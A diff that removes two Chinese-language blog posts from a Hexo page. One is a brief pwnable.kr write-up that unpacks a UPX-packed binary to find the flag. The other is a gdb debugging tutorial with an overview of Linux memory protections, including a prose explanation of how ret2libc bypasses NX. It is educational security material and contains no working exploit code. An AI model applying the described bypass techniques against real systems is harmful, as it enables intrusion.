@@ -1863,549 +2222,6 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/04/12/pwnable-kr4-flag/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/12/pwnable-kr4-flag/" class="post-title-link" itemprop="url">pwnable-kr4-flag</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-04-12 22:12:02" itemprop="dateCreated datePublished" datetime="2019-04-12T22:12:02+08:00">2019-04-12</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Updated at: 2019-08-16 20:07:47" itemprop="dateModified" datetime="2019-08-16T20:07:47+08:00">2019-08-16</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>题目要求是二进制逆向</p>
-<p>先用64位IDA打开，观察<br><img src="/2019/04/12/pwnable-kr4-flag/1.png" alt=""><br>再根据题目中packed关键词推断存在加壳，再根据binary提示，使用winhex打开文件（也可查看IDA中Hex窗口）<br>可见存在UPX加壳，对于脱壳，Windows可以使用UPX Tool工具，Lunix可以使用命令upx -d 文件名</p>
-<p>发现upx压缩了，linux下使用upx -d<br><img src="/2019/04/12/pwnable-kr4-flag/UPX.PNG" alt=""><br>解压缩之后在ida载入，发现关键代码如下：<br><img src="/2019/04/12/pwnable-kr4-flag/2.PNG" alt=""><br>找到后，输入flag<br><img src="/2019/04/12/pwnable-kr4-flag/3.PNG" alt=""><br>发现不对<br>所以是显示不完全<br>双击 进一步查看<br><img src="/2019/04/12/pwnable-kr4-flag/4.PNG" alt=""><br>或者将脱壳后的文件再用WinHex打开，搜索文本UPX得到flag<br><img src="/2019/04/12/pwnable-kr4-flag/tj.png" alt=""></p>
-<p>flag = UPX…? sounds like a delivery service :)</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/04/07/gdb/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/07/gdb/" class="post-title-link" itemprop="url">gdb</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-04-07 16:05:16" itemprop="dateCreated datePublished" datetime="2019-04-07T16:05:16+08:00">2019-04-07</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Updated at: 2019-05-13 21:06:14" itemprop="dateModified" datetime="2019-05-13T21:06:14+08:00">2019-05-13</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><a href="https://blog.csdn.net/zdy0_2004/article/details/80102076" target="_blank" rel="noopener"></a></p>
-<h1 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h1><p><img src="/2019/04/07/gdb/1.PNG" alt=""></p>
-<h2 id="用root权限的Terminal-或一般权限的Terminal-的vi编辑器编写一个C程序a-c："><a href="#用root权限的Terminal-或一般权限的Terminal-的vi编辑器编写一个C程序a-c：" class="headerlink" title="用root权限的Terminal(或一般权限的Terminal)的vi编辑器编写一个C程序a.c："></a>用root权限的Terminal(或一般权限的Terminal)的vi编辑器编写一个C程序a.c：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> 　　<span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"> 　　<span class="keyword">int</span> b = a;</span><br><span class="line"></span><br><span class="line"> 　　<span class="built_in">printf</span>(<span class="string">"a = %d, b =%d\n"</span>, a, b);</span><br><span class="line"> </span><br><span class="line">　　<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>保存文件要按esc，这样就会退回vi的命令模式。<br>按完esc后输入冒号（英文的），然后就转换到了末行模式了，末行模式决定是否保存文件。<br>末行模式下可以按x来保存，x命令可以保存编辑好的文件。<br>也可以用到wq来保存，如果是q!则不保存哦，这点要自己谨记在心，这里我就保存一下vi编写的文件<br>来换切换vi窗口和命令行和终端命令行窗口的快捷键：<br>Ctl+Z  （返回终端）<br>$fg    (进入vi)</p>
-<h2 id="在可执行文件中加入源码信息"><a href="#在可执行文件中加入源码信息" class="headerlink" title="在可执行文件中加入源码信息"></a>在可执行文件中加入源码信息</h2><p>这个过程通过gcc来完成：</p>
-<p>gcc –o a a.c -g</p>
-<p>-o选项的作用是：对命令输出结果进行导入操作，这里是把gcc –o a a.c -g的操作结果输出到文件a(文件名可以自定义)中进行保存。</p>
-<p>-g选项的作用是：在可执行文件中加入源码信息，比如：可执行文件中第几条机器指令对应源代码的第几行，但并不是把整个源文件都嵌入到可执行文件中，而是在调试时必须保证gdb能找到源文件。</p>
-<h2 id="进入gdb"><a href="#进入gdb" class="headerlink" title="进入gdb"></a>进入gdb</h2><p><img src="/2019/04/07/gdb/2.PNG" alt=""></p>
-<h2 id="gdb调试常用命令"><a href="#gdb调试常用命令" class="headerlink" title="gdb调试常用命令"></a>gdb调试常用命令</h2><h3 id="1-start"><a href="#1-start" class="headerlink" title="[1] start"></a>[1] start</h3><p>　　用start命令开始执行程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x40052e: file a.c, line 5.</span><br><span class="line">Starting program: /root/2/02/a </span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at a.c:5</span><br><span class="line">5           int a = 1;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
-<p>　　gdb提示准备执行a.c程序的第六行代码。然后继续用(gdb)提示需要输入的命令。</p>
-<h3 id="2-单步执行-n"><a href="#2-单步执行-n" class="headerlink" title="[2] 单步执行(n)"></a>[2] 单步执行(n)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x652: file a.c, line 5.</span><br><span class="line">Starting program: /home/linhua/a </span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at a.c:5</span><br><span class="line">5       int a=1;</span><br><span class="line">(gdb) n</span><br><span class="line">6       int b=a;</span><br><span class="line">(gdb) n</span><br><span class="line">8       printf(&quot;a=%d,b=%d\n&quot;,a,b);</span><br><span class="line">(gdb) n</span><br><span class="line">a=1,b=1</span><br><span class="line">9       return 0;</span><br><span class="line">(gdb) quit</span><br><span class="line">A debugging session is active.</span><br><span class="line"></span><br><span class="line">    Inferior 1 [process 11415] will be killed.</span><br><span class="line"></span><br><span class="line">Quit anyway? (y or n) y</span><br></pre></td></tr></table></figure>
-<p>在start命令后，每输入一个n就能够单步执行一条语句（输入一个命令后，直接回车表示最近输入命令的含义）。当程序执行完时，可以输入quit命令来退出gdb模式。<br><img src="/2019/04/07/gdb/n.PNG" alt=""></p>
-<h3 id="3-gdb断点调试"><a href="#3-gdb断点调试" class="headerlink" title="[3] gdb断点调试"></a>[3] gdb断点调试</h3><p><img src="/2019/04/07/gdb/d.PNG" alt=""><br>gdb  a会进入a可执行程序的gdb模式，start命令就使程序准备运行程序中的第一条语句。b 8是breakpoint  8的简写（breakpoint的参数也可以以是某个函数名，表示在此函数处设置一个断点），表示在程序第八行设置一个断点。c是continue的缩写，表示继续运行程序，程序会在设置断点处停下来。displayb表示将b的值显示出来（undisplay取消对变量的跟踪），然后再输入单步调试命令n（next）就可以使程序继续运行。</p>
-<p>　　可见断点有助于快速跳过没有问题的代码，然后在有问题的代码上慢慢走慢慢分析，“断点加单步”是使用调试器的基本方法。至于应该在哪里设置断点，怎么知道哪些代码可以跳过，而哪些代码要慢慢走，也要通过对错误现象的分析和假设来确定，以前我们用printf打印中间结果时，也要分析应该在哪里插入printf，打印哪些中间结果，调试的基本思路是一样的。</p>
-<h3 id="4-info"><a href="#4-info" class="headerlink" title="[4]info"></a>[4]info</h3><p>　　一次调试可以设置多个断点，用info命令可以查看已经设置的断点：</p>
-<h3 id="5-delete"><a href="#5-delete" class="headerlink" title="[5]delete"></a>[5]delete</h3><p>　　每个断点都有一个编号（有的断点行数不一样，但地址却一样，有的地方不能够设置断点或者说与上一个设置的断点等效），可以用编号指定删除某个断点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">(gdb) b 7</span><br><span class="line">Breakpoint 2 at 0x40053b: file a.c, line 7.</span><br><span class="line">(gdb) b 8</span><br><span class="line">Note: breakpoint 2 also set at pc 0x40053b.</span><br><span class="line">Breakpoint 3 at 0x40053b: file a.c, line 8.</span><br><span class="line">(gdb) i breakpoints </span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">      breakpoint     keep y   0x000000000040053b in main at a.c:7</span><br><span class="line">      breakpoint     keep y   0x000000000040053b in main at a.c:8</span><br><span class="line">(gdb) delete 3</span><br><span class="line">(gdb) i breakpoints </span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">      breakpoint     keep y   0x000000000040053b in main at a.c:7</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
-<p>有时候一个断点暂时不用可以禁用掉而不必删除，这样以后想用的时候可以直接启用，而不必重新从代码里找应该在哪一行设断点，这个过程用 disable 和 enable 来完成。</p>
-<h3 id="6-条件断点-（break-和run）"><a href="#6-条件断点-（break-和run）" class="headerlink" title="[6]条件断点 （break 和run）"></a>[6]条件断点 （break 和run）</h3><p>　　gdb的断点功能非常灵活，还可以设置断点在满足某个条件时才激活，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">//先把其余的断点删掉。</span><br><span class="line">(gdb) b 9 if a == 2</span><br><span class="line">Breakpoint 5 at 0x400552: file a.c, line 9.</span><br><span class="line">(gdb) i breakpoints </span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">      breakpoint     keep y   0x0000000000400552 in main at a.c:9</span><br><span class="line">        stop only if a == 2</span><br><span class="line">(gdb) r</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /root/2/02/a </span><br><span class="line">a = 1, b = 1</span><br><span class="line">[Inferior 1 (process 22968) exited normally]</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
-<p>　r表示从头开始运行程序，在a==2的条件下中断才有效。a不等于2，所以中断无效。　</p>
-<h3 id="7-gdb的观察点（watch-和c）"><a href="#7-gdb的观察点（watch-和c）" class="headerlink" title="[7] gdb的观察点（watch 和c）"></a>[7] gdb的观察点（watch 和c）</h3><p>　　断点是当程序执行到某一代码行时中断，而观察点是当程序访问某个存储单元时中断，如果我们不知道某个存储单元是在哪里被改动的，这时候观察点尤其有用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2zeeailqvwws5dcuivdbZ:~/2/02# gdb a</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from a...done.</span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x40052e: file a.c, line 5.</span><br><span class="line">Starting program: /root/2/02/a </span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at a.c:5</span><br><span class="line">5           int a = 1;</span><br><span class="line">(gdb) watch b</span><br><span class="line">Hardware watchpoint 2: b</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: b</span><br><span class="line"></span><br><span class="line">Old value = 0</span><br><span class="line">New value = 1</span><br><span class="line">main () at a.c:8</span><br><span class="line">8           printf(&quot;a = %d, b = %d\n&quot;, a, b);</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
-<p>　　程序执行到b存储单元，将此执行单元执行前后的值都显示出来。</p>
-<h3 id="8-段错误"><a href="#8-段错误" class="headerlink" title="[8] 段错误"></a>[8] 段错误</h3><p>　　如果程序运行时出现段错误，用gdb可以很容易定位到究竟是哪一行引发的段错误。在gdb中运行，遇到段错误会自动停下来，这时可以用命令查看当前执行到哪一行代码了。</p>
-<p>　　gdb显示段错误出现在 _IO_vfscanf 函数中，用bt命令可以看到是哪一个函数调用了它。</p>
-<h2 id="gdb基本命令"><a href="#gdb基本命令" class="headerlink" title="gdb基本命令"></a>gdb基本命令</h2><p>gdb有许多有用的命令如list（显示源代码），这样就可以结合源码与调试信息更好的进行调试。将gdb常用命令摘抄如下表：<br>l &lt;n>              输出第n行到n+9行的源代码</p>
-<p>break &lt;n>      在第n行设置断点</p>
-<p>info break        查看断点信息</p>
-<p>r                    运行</p>
-<p>n                    单步执行</p>
-<p>c                    继续执行</p>
-<p>p varName      输出变量值</p>
-<p>q                    退出</p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>backtrace(bt)</td>
-<td>查看各级函数调用及参数</td>
-</tr>
-<tr>
-<td>finish</td>
-<td>连续运行到当前函数返回为止，然后停下来等待命令</td>
-</tr>
-<tr>
-<td>frame(f) 帧编号</td>
-<td>选择栈帧</td>
-</tr>
-<tr>
-<td>info(i)  locals</td>
-<td>查看当前栈帧局部变量的值</td>
-</tr>
-<tr>
-<td>list(l)</td>
-<td>列出源代码，接着上次的位置往下列，每次列十行</td>
-</tr>
-<tr>
-<td>list  行号</td>
-<td>列出第几行开始的源代码list  </td>
-</tr>
-<tr>
-<td>函数名</td>
-<td>列出某个函数的源代码</td>
-</tr>
-<tr>
-<td>next(n)</td>
-<td>执行下一行语句</td>
-</tr>
-<tr>
-<td>print(p)</td>
-<td>打印表达式的值，通过表达式的值可以修改变量的值或者调用函数</td>
-</tr>
-<tr>
-<td>quit(q)</td>
-<td>退出gdb调试环境</td>
-</tr>
-<tr>
-<td>set  var</td>
-<td>修改变量的值</td>
-</tr>
-<tr>
-<td>start</td>
-<td>开始执行程序，停在main函数第一行语句前面等待命令</td>
-</tr>
-<tr>
-<td>step(s)</td>
-<td>执行下一行语句，如果有函数则进入到函数中</td>
-</tr>
-<tr>
-<td>break(b)  行号</td>
-<td>在某一行设置断点</td>
-</tr>
-<tr>
-<td>break  函数名</td>
-<td>在某个函数开头设置断点</td>
-</tr>
-<tr>
-<td>break(b)… if…</td>
-<td>设置条件断点</td>
-</tr>
-<tr>
-<td>continue(c)</td>
-<td>从当前位置开始连续运行程序</td>
-</tr>
-<tr>
-<td>delete breakpoints 断点号</td>
-<td>删掉此号的断点</td>
-</tr>
-<tr>
-<td>display  变量名</td>
-<td>跟踪查看某个变量，每次停下来都显示它的值</td>
-</tr>
-<tr>
-<td>disable  breakpoints 断点号</td>
-<td>禁用此断点</td>
-</tr>
-<tr>
-<td>enable  断点号</td>
-<td>启用此断点</td>
-</tr>
-<tr>
-<td>info(i)  breakpoints</td>
-<td>查看当前设置了哪些断点</td>
-</tr>
-<tr>
-<td>run(r)</td>
-<td>从头开始连续运行程序</td>
-</tr>
-<tr>
-<td>undisplay  跟踪显示行号</td>
-<td>取消跟踪显示</td>
-</tr>
-<tr>
-<td>watch</td>
-<td>设置观察点</td>
-</tr>
-<tr>
-<td>info(i)   watchpoints</td>
-<td>查看当前设置了哪些观察点</td>
-</tr>
-<tr>
-<td>x</td>
-<td>从某个位置开始打印存储单元的内容，全部当成字节来看，而不区分哪个字节属于哪个变量</td>
-</tr>
-<tr>
-<td>disassemble</td>
-<td>反汇编当前函数或者指定的函数，单独用disassemble命令是反汇编当前函数，如果disassemble命令后面跟函数名或地址则反汇编指定的函数。</td>
-</tr>
-<tr>
-<td>si</td>
-<td>可以一条指令一条指令地单步调试。</td>
-</tr>
-<tr>
-<td>info  registers</td>
-<td>可以显示所有寄存器的当前值。在gdb中表示寄存器名时前面要加个$，例如p $esp可以打印esp寄存器的值。</td>
-</tr>
-<tr>
-<td>set follow-fork-mode child/parent</td>
-<td>设置gdb在fork之后跟踪子进程/父进程</td>
-</tr>
-<tr>
-<td>set  args  ‘command-line’</td>
-<td>给执行的程序传命令行参数</td>
-</tr>
-<tr>
-<td>s(stepin)</td>
-<td>进入子函数</td>
-</tr>
-</tbody>
-</table>
-<h1 id="checksec（此处使用gdbdb里peda插件里自带的）"><a href="#checksec（此处使用gdbdb里peda插件里自带的）" class="headerlink" title="checksec（此处使用gdbdb里peda插件里自带的）"></a>checksec（此处使用gdbdb里peda插件里自带的）</h1><p>一开始不行，运行gdb发现<br><img src="/2019/04/07/gdb/g1.PNG" alt=""><br>发现应该是peda没弄好，重新搞一下<br>然后再次输入 gdb<br><img src="/2019/04/07/gdb/g2.PNG" alt=""><br>可以看到成功下面红色那一行，gdb-peda<br>然后就可以用peda的checksec功能了<br><img src="/2019/04/07/gdb/g3.PNG" alt=""></p>
-<h1 id="WINDOWS和LINUX下的内存保护机制"><a href="#WINDOWS和LINUX下的内存保护机制" class="headerlink" title="WINDOWS和LINUX下的内存保护机制"></a>WINDOWS和LINUX下的内存保护机制</h1><h2 id="一、LINUX下的内存防护机制"><a href="#一、LINUX下的内存防护机制" class="headerlink" title="一、LINUX下的内存防护机制"></a>一、LINUX下的内存防护机制</h2><h3 id="0x00、checksec"><a href="#0x00、checksec" class="headerlink" title="0x00、checksec"></a>0x00、checksec</h3><p>（就是上面的工具了）<br>checksec 用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。<br>一般来说，如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下： </p>
-<h3 id="0x01、CANNARY"><a href="#0x01、CANNARY" class="headerlink" title="0x01、CANNARY"></a>0x01、CANNARY</h3><p>CANNARY(栈溢出保护)是一种缓冲区溢出攻击缓解手段。<br>启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。<br>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。<br>这种方法很像windows下的启用GS选项</p>
-<h3 id="0x02、FORTIFY"><a href="#0x02、FORTIFY" class="headerlink" title="0x02、FORTIFY"></a>0x02、FORTIFY</h3><p>这个网上的信息很少因此举个例子来描述：<br>void fun(char <em>s) {<br>        char buf[0x100];<br>        strcpy(buf, s);<br>        /</em> Don’t allow gcc to optimise away the buf */<br>        asm volatile(“” :: “m” (buf));<br>}</p>
-<p>用包含参数-U_FORTIFY_SOURCE编译<br>08048450 <fun>:<br>  push   %ebp               ;<br>  mov    %esp,%ebp</fun></p>
-<p>  sub    $0x118,%esp        ; 将0x118存储到栈上<br>  mov    0x8(%ebp),%eax     ; 将目标参数载入eax<br>  mov    %eax,0x4(%esp)     ; 保存目标参数<br>  lea    -0x108(%ebp),%eax  ; 数组buf<br>  mov    %eax,(%esp)        ; 保存<br>  call   8048320 &lt;strcpy@plt&gt;</p>
-<p>  leave                     ;<br>  ret<br>用包含参数-D_FORTIFY_SOURCE=2编译<br>08048470 <fun>:<br>  push   %ebp               ;<br>  mov    %esp,%ebp</fun></p>
-<p>  sub    $0x118,%esp        ;<br>  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存<br>  mov    0x8(%ebp),%eax     ;<br>  mov    %eax,0x4(%esp)     ;<br>  lea    -0x108(%ebp),%eax  ;<br>  mov    %eax,(%esp)        ;<br>  call   8048370 &lt;__strcpy_chk@plt&gt;</p>
-<p>  leave                      ;<br>  ret<br>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
-<h3 id="0x03、NX"><a href="#0x03、NX" class="headerlink" title="0x03、NX"></a>0x03、NX</h3><p>NX即No-eXecute（不可执行）的意思，NX的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。和windows下的DEP原理相同。<br>关于NX的绕过方式在linux叫做Ret2libc，与WINDOWS下的ROP大相径庭。<br>既然注入Shellcode无法执行，进程和动态库的代码段怎么也要执行吧，具有可执行属性，那攻击者能否利用进程空间现有的代码段进行攻击，答案是肯定的。<br>linux下shellcode的功能是通过execute执行/bin/sh，那么系统函数库（Linux称为glibc）有个system函数，它就是通过/bin/sh命令去执行一个用户执行命令或者脚本，我们完全可以利用system来实现Shellcode的功能。EIP一旦改写成system函数地址后，那执行system函数时，它需要获取参数。而根据Linux X86 32位函数调用约定，参数是压到栈上的。噢，栈空间完全由我们控制了，所以控制system的函数不是一件难事情。<br>这种攻击方法称之为ret2libc，即return-to-libc，返回到系统库函数执行 的攻击方法。<br>有关ret2libc的攻击方式可以参考<a href="http://blog.csdn.net/linyt/article/details/43643499。" target="_blank" rel="noopener">http://blog.csdn.net/linyt/article/details/43643499。</a></p>
-<h3 id="0x04、PIE"><a href="#0x04、PIE" class="headerlink" title="0x04、PIE"></a>0x04、PIE</h3><p>一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。<br>内存地址随机化机制，有以下三种情况0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</p>
-<p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。<br>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
-<h3 id="0x05、RELRO"><a href="#0x05、RELRO" class="headerlink" title="0x05、RELRO"></a>0x05、RELRO</h3><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标,尤其是存储函数指针的区域. 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.<br>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation.大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.<br>RELRO设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。<br>有关RELRO的技术细节 <a href="https://hardenedlinux.github.io/2016/11/25/RelRO.html。" target="_blank" rel="noopener">https://hardenedlinux.github.io/2016/11/25/RelRO.html。</a><br>有关GOT攻击的技术原理参考 <a href="http://blog.csdn.net/smalosnail/article/details/53247502。" target="_blank" rel="noopener">http://blog.csdn.net/smalosnail/article/details/53247502。</a></p>
-<p>windows下的</p>
